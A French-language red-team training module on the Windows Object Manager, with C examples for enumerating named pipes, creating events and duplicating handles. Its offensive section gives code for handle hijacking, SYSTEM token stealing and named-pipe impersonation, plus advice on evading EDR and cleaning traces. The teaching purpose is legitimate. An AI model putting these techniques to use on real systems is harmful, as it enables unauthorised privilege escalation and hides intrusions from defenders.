# Object Manager (Gestionnaire d'Objets Windows)

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- Comprendre l'architecture du Object Manager Windows
- Manipuler les handles et comprendre la Handle Table
- Identifier et exploiter les différents types d'objets kernel
- Naviguer dans le namespace des objets
- Exploiter les handles pour l'élévation de privilèges et l'évasion

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C (structures, pointeurs)
- Les concepts de User Mode vs Kernel Mode
- La Native API (W16_ntdll_internals)
- Les bases de sécurité Windows

## Introduction

Le **Object Manager** est un composant central du kernel Windows qui gère tous les **objets kernel** : processus, threads, fichiers, événements, mutex, etc. Comprendre ce système est crucial pour le Red Teaming car il permet de manipuler les ressources système de manière avancée.

### Pourquoi ce sujet est important ?

```ascii
OBJECT MANAGER = SYSTÈME D'ORGANISATION DU KERNEL

┌────────────────────────────────────────────────────┐
│ TYPES D'OBJETS KERNEL COURANTS                     │
├────────────────────────────────────────────────────┤
│ • Process          → EPROCESS (processus)          │
│ • Thread           → ETHREAD (threads)             │
│ • File             → FILE_OBJECT (fichiers)        │
│ • Event            → KEVENT (synchronisation)      │
│ • Mutex/Semaphore  → KMUTEX (locks)                │
│ • Section          → SECTION (mémoire partagée)    │
│ • Token            → TOKEN (sécurité)              │
│ • SymbolicLink     → SYMLINK (liens)               │
└────────────────────────────────────────────────────┘

USAGES OFFENSIFS :
┌────────────────────────────────────────────────────┐
│ 1. HANDLE HIJACKING                                │
│    → Voler handle process d'un autre processus    │
│    → Réutiliser handle avec privilèges élevés     │
├────────────────────────────────────────────────────┤
│ 2. OBJECT NAMESPACE EXPLORATION                    │
│    → Énumérer objets système (\Device, \Driver...) │
│    → Trouver objets intéressants (pipes, mailslots)│
├────────────────────────────────────────────────────┤
│ 3. TOKEN MANIPULATION                              │
│    → Dupliquer token SYSTEM                        │
│    → Impersonation pour élévation privilèges      │
└────────────────────────────────────────────────────┘

Analogie : Object Manager = système de fichiers du kernel
           Handles = pointeurs sécurisés vers objets kernel
```

## Concepts fondamentaux

### Concept 1 : Handles vs Pointeurs

Un **handle** est un index dans la **Handle Table** d'un processus.

```ascii
DIFFÉRENCE HANDLE vs POINTEUR :

POINTEUR (kernel mode) :
┌──────────────────────────────────┐
│ 0xFFFF8A0012345678               │ ← Adresse mémoire kernel directe
│ → Pointe vers EPROCESS           │
└──────────────────────────────────┘

HANDLE (user mode) :
┌──────────────────────────────────┐
│ 0x00000ABC                       │ ← Index dans Handle Table
│ → Indirection via Handle Table   │
│ → Validation par Object Manager  │
└──────────────────────────────────┘

HANDLE TABLE D'UN PROCESSUS :

Index   Object Pointer            Type       Access Rights
────────────────────────────────────────────────────────────
0x004   0xFFFF8A0012340000        Process    PROCESS_ALL_ACCESS
0x008   0xFFFF8A0012341000        Thread     THREAD_ALL_ACCESS
0x00C   0xFFFF8A0012342000        File       FILE_READ_DATA
0x010   0xFFFF8A0012343000        Event      EVENT_MODIFY_STATE
...

AVANTAGES HANDLES :
✓ Sécurité : validation access rights
✓ Indirection : objet peut bouger en mémoire
✓ Reference counting : objet pas détruit si handle ouvert
```

### Concept 2 : Object Types

Chaque objet a un **type** défini par une structure `OBJECT_TYPE`.

```c
typedef struct _OBJECT_TYPE {
    LIST_ENTRY TypeList;              // Liste de tous objets de ce type
    UNICODE_STRING Name;              // Nom du type ("Process", "Thread"...)
    PVOID DefaultObject;              // Objet par défaut
    UCHAR Index;                      // Index du type
    ULONG TotalNumberOfObjects;       // Nombre total d'objets
    ULONG TotalNumberOfHandles;       // Nombre total de handles
    ULONG HighWaterNumberOfObjects;   // Pic d'objets
    ULONG HighWaterNumberOfHandles;   // Pic de handles
    // ... méthodes (Open, Close, Delete, Parse...)
} OBJECT_TYPE, *POBJECT_TYPE;
```

**Types courants** :

```ascii
┌─────────────┬──────────────────────────────────┐
│ Type Name   │ Description                      │
├─────────────┼──────────────────────────────────┤
│ Process     │ EPROCESS - processus             │
│ Thread      │ ETHREAD - threads                │
│ File        │ FILE_OBJECT - fichiers/devices   │
│ Event       │ KEVENT - événements              │
│ Mutex       │ KMUTEX - mutual exclusion        │
│ Semaphore   │ KSEMAPHORE - compteur ressources │
│ Section     │ SECTION - mémoire partagée       │
│ Token       │ TOKEN - jetons sécurité          │
│ Job         │ JOB - groupes de processus       │
│ Directory   │ OBJECT_DIRECTORY - namespace     │
│ SymbolicLink│ SYMLINK - liens symboliques      │
│ Key         │ CM_KEY_BODY - clés registre      │
│ Port        │ ALPC_PORT - communication        │
└─────────────┴──────────────────────────────────┘
```

### Concept 3 : Object Namespace

Le Object Manager organise les objets dans un **namespace hiérarchique** similaire à un système de fichiers.

```ascii
NAMESPACE DES OBJETS WINDOWS :

\                                   (Root)
├── \GLOBAL??                       (DOS devices symlinks)
│   ├── C:  → \Device\HarddiskVolume3
│   ├── D:  → \Device\CdRom0
│   └── COM1 → \Device\Serial0
├── \Device                         (Devices physiques/logiques)
│   ├── \Device\HarddiskVolume1
│   ├── \Device\KeyboardClass0
│   ├── \Device\NamedPipe           (Named pipes)
│   │   ├── \Device\NamedPipe\pipe1
│   │   └── \Device\NamedPipe\lsass
│   └── \Device\Mailslot
├── \Driver                         (Drivers kernel)
│   ├── \Driver\Disk
│   ├── \Driver\Null
│   └── \Driver\Beep
├── \FileSystem                     (File systems)
│   ├── \FileSystem\Ntfs
│   └── \FileSystem\FastFat
├── \BaseNamedObjects               (Objets user-mode partagés)
│   ├── Session events
│   └── Mutex, Semaphores globaux
├── \Sessions                       (Sessions utilisateur)
│   ├── \Sessions\0\...
│   └── \Sessions\1\...
└── \Windows                        (Objets système Windows)

NAVIGATION :
NtOpenDirectoryObject() pour ouvrir directory
NtQueryDirectoryObject() pour lister contenu
```

### Concept 4 : OBJECT_ATTRIBUTES

Structure utilisée pour créer/ouvrir des objets.

```c
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;                       // sizeof(OBJECT_ATTRIBUTES)
    HANDLE RootDirectory;               // Handle directory parent (optionnel)
    PUNICODE_STRING ObjectName;         // Nom de l'objet
    ULONG Attributes;                   // Flags
    PVOID SecurityDescriptor;           // Security descriptor (optionnel)
    PVOID SecurityQualityOfService;     // QoS (optionnel)
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// Macro d'initialisation
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = r;                         \
    (p)->Attributes = a;                            \
    (p)->ObjectName = n;                            \
    (p)->SecurityDescriptor = s;                    \
    (p)->SecurityQualityOfService = NULL;           \
}

// Attributes flags
#define OBJ_INHERIT             0x00000002  // Handle héritable
#define OBJ_PERMANENT           0x00000010  // Objet permanent
#define OBJ_EXCLUSIVE           0x00000020  // Accès exclusif
#define OBJ_CASE_INSENSITIVE    0x00000040  // Nom case-insensitive
#define OBJ_OPENIF              0x00000080  // Open if exists
#define OBJ_KERNEL_HANDLE       0x00000200  // Kernel handle
```

## Mise en pratique

### Étape 1 : Énumérer les objets dans un directory

```c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

// Énumérer objets dans \Device\NamedPipe
void enumerate_named_pipes() {
    UNICODE_STRING dirName;
    RtlInitUnicodeString(&dirName, L"\\Device\\NamedPipe");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &dirName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hDirectory = NULL;
    NTSTATUS status = NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &objAttr);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenDirectoryObject failed: 0x%08X\n", status);
        return;
    }

    printf("[+] Named Pipes:\n\n");

    // Buffer pour résultats
    BYTE buffer[4096];
    ULONG context = 0;
    ULONG returnLength = 0;

    while (TRUE) {
        status = NtQueryDirectoryObject(hDirectory, buffer, sizeof(buffer),
                                        FALSE, FALSE, &context, &returnLength);

        if (!NT_SUCCESS(status)) break;

        POBJECT_DIRECTORY_INFORMATION pInfo = (POBJECT_DIRECTORY_INFORMATION)buffer;

        while (pInfo->Name.Length != 0) {
            printf("  %wZ (Type: %wZ)\n", &pInfo->Name, &pInfo->TypeName);
            pInfo++;
        }
    }

    NtClose(hDirectory);
}
```

### Étape 2 : Créer et ouvrir un objet Event

```c
// Créer un objet Event nommé
HANDLE create_named_event(const wchar_t* eventName) {
    UNICODE_STRING uEventName;
    RtlInitUnicodeString(&uEventName, eventName);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uEventName,
                               OBJ_CASE_INSENSITIVE,
                               NULL, NULL);

    HANDLE hEvent = NULL;
    NTSTATUS status = NtCreateEvent(&hEvent,
                                    EVENT_ALL_ACCESS,
                                    &objAttr,
                                    NotificationEvent,
                                    FALSE); // Initial state

    if (NT_SUCCESS(status)) {
        printf("[+] Event créé: %p\n", hEvent);
        return hEvent;
    } else {
        printf("[-] NtCreateEvent failed: 0x%08X\n", status);
        return NULL;
    }
}

// Ouvrir un Event existant
HANDLE open_named_event(const wchar_t* eventName) {
    UNICODE_STRING uEventName;
    RtlInitUnicodeString(&uEventName, eventName);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uEventName,
                               OBJ_CASE_INSENSITIVE,
                               NULL, NULL);

    HANDLE hEvent = NULL;
    NTSTATUS status = NtOpenEvent(&hEvent, EVENT_ALL_ACCESS, &objAttr);

    if (NT_SUCCESS(status)) {
        printf("[+] Event ouvert: %p\n", hEvent);
        return hEvent;
    } else {
        printf("[-] NtOpenEvent failed: 0x%08X\n", status);
        return NULL;
    }
}
```

### Étape 3 : Dupliquer un handle

```c
// Dupliquer handle dans le même processus
HANDLE duplicate_handle_local(HANDLE hSource) {
    HANDLE hDuplicate = NULL;
    NTSTATUS status = NtDuplicateObject(
        NtCurrentProcess(),    // Source process
        hSource,               // Source handle
        NtCurrentProcess(),    // Target process
        &hDuplicate,           // Target handle
        0,                     // Desired access (0 = same)
        0,                     // Attributes
        DUPLICATE_SAME_ACCESS  // Options
    );

    if (NT_SUCCESS(status)) {
        printf("[+] Handle dupliqué: 0x%p → 0x%p\n", hSource, hDuplicate);
        return hDuplicate;
    } else {
        printf("[-] NtDuplicateObject failed: 0x%08X\n", status);
        return NULL;
    }
}

// Dupliquer handle depuis un autre processus (handle hijacking)
HANDLE duplicate_handle_from_process(DWORD sourcePID, HANDLE hSource) {
    // 1. Ouvrir processus source
    OBJECT_ATTRIBUTES objAttr = {0};
    CLIENT_ID clientId = {(HANDLE)sourcePID, NULL};
    HANDLE hSourceProcess = NULL;

    NTSTATUS status = NtOpenProcess(&hSourceProcess,
                                    PROCESS_DUP_HANDLE,
                                    &objAttr,
                                    &clientId);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenProcess failed: 0x%08X\n", status);
        return NULL;
    }

    // 2. Dupliquer handle
    HANDLE hDuplicate = NULL;
    status = NtDuplicateObject(
        hSourceProcess,        // Source process
        hSource,               // Source handle
        NtCurrentProcess(),    // Target process (nous)
        &hDuplicate,           // Target handle
        0,
        0,
        DUPLICATE_SAME_ACCESS
    );

    NtClose(hSourceProcess);

    if (NT_SUCCESS(status)) {
        printf("[+] Handle volé de PID %d: 0x%p\n", sourcePID, hDuplicate);
        return hDuplicate;
    } else {
        printf("[-] NtDuplicateObject failed: 0x%08X\n", status);
        return NULL;
    }
}
```

### Étape 4 : Interroger informations sur un objet

```c
typedef enum _OBJECT_INFORMATION_CLASS {
    ObjectBasicInformation,        // 0
    ObjectNameInformation,         // 1
    ObjectTypeInformation,         // 2
    ObjectTypesInformation,        // 3
    ObjectHandleFlagInformation    // 4
} OBJECT_INFORMATION_CLASS;

typedef struct _OBJECT_BASIC_INFORMATION {
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    // ...
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

void query_handle_info(HANDLE hObject) {
    OBJECT_BASIC_INFORMATION basicInfo = {0};
    ULONG returnLength = 0;

    NTSTATUS status = NtQueryObject(hObject,
                                    ObjectBasicInformation,
                                    &basicInfo,
                                    sizeof(basicInfo),
                                    &returnLength);

    if (NT_SUCCESS(status)) {
        printf("[+] Object Info:\n");
        printf("    Attributes:     0x%08X\n", basicInfo.Attributes);
        printf("    GrantedAccess:  0x%08X\n", basicInfo.GrantedAccess);
        printf("    HandleCount:    %u\n", basicInfo.HandleCount);
        printf("    PointerCount:   %u\n", basicInfo.PointerCount);
    }
}
```

## Application offensive

### Contexte Red Team

#### 1. Handle Hijacking pour élévation de privilèges

```c
// Voler un handle PROCESS_ALL_ACCESS depuis un processus privilégié
HANDLE steal_process_handle(DWORD targetPID) {
    // 1. Énumérer handles système (nécessite SeDebugPrivilege)
    // Utiliser NtQuerySystemInformation(SystemHandleInformation)

    // 2. Chercher handle vers notre processus depuis processus SYSTEM
    // 3. Dupliquer ce handle vers notre processus
    // 4. Maintenant on a PROCESS_ALL_ACCESS même si on est unprivileged

    // Exemple simplifié :
    HANDLE hStolen = duplicate_handle_from_process(
        privileged_pid,     // PID d'un processus SYSTEM
        0x1234             // Handle qu'il détient (trouvé via enumération)
    );

    return hStolen;
}
```

#### 2. Token Stealing

```c
// Voler token SYSTEM d'un processus
BOOL steal_system_token() {
    // 1. Trouver processus SYSTEM (ex: winlogon.exe, lsass.exe)
    DWORD systemPID = find_system_process();

    // 2. Ouvrir processus SYSTEM
    OBJECT_ATTRIBUTES objAttr = {0};
    CLIENT_ID clientId = {(HANDLE)systemPID, NULL};
    HANDLE hSystemProcess = NULL;

    NtOpenProcess(&hSystemProcess, PROCESS_QUERY_INFORMATION, &objAttr, &clientId);

    // 3. Ouvrir token du processus SYSTEM
    HANDLE hSystemToken = NULL;
    NtOpenProcessToken(hSystemProcess, TOKEN_DUPLICATE, &hSystemToken);

    // 4. Dupliquer token
    HANDLE hDuplicatedToken = NULL;
    SECURITY_QUALITY_OF_SERVICE sqos = {
        sizeof(sqos), SecurityImpersonation, SECURITY_DYNAMIC_TRACKING, FALSE
    };
    OBJECT_ATTRIBUTES tokenAttr = {0};
    tokenAttr.SecurityQualityOfService = &sqos;

    NtDuplicateToken(hSystemToken, TOKEN_ALL_ACCESS, &tokenAttr,
                     FALSE, TokenImpersonation, &hDuplicatedToken);

    // 5. Impersonate avec le token SYSTEM
    NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken,
                           &hDuplicatedToken, sizeof(HANDLE));

    printf("[+] Token SYSTEM volé et appliqué !\n");

    NtClose(hSystemToken);
    NtClose(hSystemProcess);

    return TRUE;
}
```

#### 3. Named Pipe Impersonation

```c
// Créer named pipe et attendre connexion client pour voler son token
BOOL pipe_impersonation_attack() {
    // 1. Créer named pipe
    HANDLE hPipe = CreateNamedPipeA(
        "\\\\.\\pipe\\evil_pipe",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL
    );

    printf("[+] Pipe créé: \\\\.\\pipe\\evil_pipe\n");
    printf("[*] En attente de connexion client privilégié...\n");

    // 2. Attendre connexion
    ConnectNamedPipe(hPipe, NULL);

    printf("[+] Client connecté !\n");

    // 3. Impersonate client
    if (ImpersonateNamedPipeClient(hPipe)) {
        printf("[+] Impersonation réussie !\n");

        // Maintenant on a le token du client
        HANDLE hToken = NULL;
        OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hToken);

        // On peut élever nos privilèges si client était admin
        check_token_privileges(hToken);

        NtClose(hToken);
        RevertToSelf();
    }

    NtClose(hPipe);
    return TRUE;
}
```

### Considérations OPSEC

```ascii
DÉTECTIONS & MITIGATIONS

┌────────────────────────────────────────────────┐
│ INDICATEURS SUSPECTS                           │
├────────────────────────────────────────────────┤
│ ✗ NtDuplicateObject depuis processus distant  │
│   → EDR détecte handle hijacking              │
│                                                │
│ ✗ NtOpenProcess avec PROCESS_DUP_HANDLE       │
│   → Accès handles d'autres processus          │
│                                                │
│ ✗ Token impersonation vers privilèges plus   │
│   élevés → Détecté par token monitoring       │
└────────────────────────────────────────────────┘

┌────────────────────────────────────────────────┐
│ BONNES PRATIQUES                               │
├────────────────────────────────────────────────┤
│ ✓ Combiner avec autres techniques d'évasion   │
│ ✓ Utiliser syscalls directs                   │
│ ✓ Éviter lsass.exe/winlogon.exe (surveillés)  │
│ ✓ Cibler processus moins monitorés            │
│ ✓ Nettoyer traces après opération             │
└────────────────────────────────────────────────┘
```

## Résumé

- **Object Manager** = gestionnaire centralisé de tous les objets kernel Windows
- **Handles** = indices dans Handle Table, indirection sécurisée vers objets
- **Object Namespace** = hiérarchie type filesystem (\Device, \Driver, \BaseNamedObjects...)
- **Handle Hijacking** = voler handle d'un autre processus pour hériter de ses privilèges
- **Token Stealing** = dupliquer token SYSTEM pour élévation de privilèges
- **Named Pipes** = vecteur d'attaque via impersonation de clients privilégiés
- Comprendre Object Manager essentiel pour techniques avancées Windows internals

## Ressources complémentaires

- [Windows Internals 7th Edition - Object Manager](https://www.microsoftpressstore.com/store/windows-internals-part-1-system-architecture-processes-9780735684188)
- [WinObj - Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/winobj)
- [Handle Hijacking - Offensive Security](https://www.offensive-security.com/metasploit-unleashed/fun-with-incognito/)
- [Token Manipulation - ired.team](https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation)
- [Object Manager Namespace - MSDN](https://docs.microsoft.com/en-us/windows/win32/sysinfo/object-namespaces)

---

**Navigation**
- [Module précédent](../06-NTDLL-Internals/)
- [Module suivant](../08-Security-Model/)
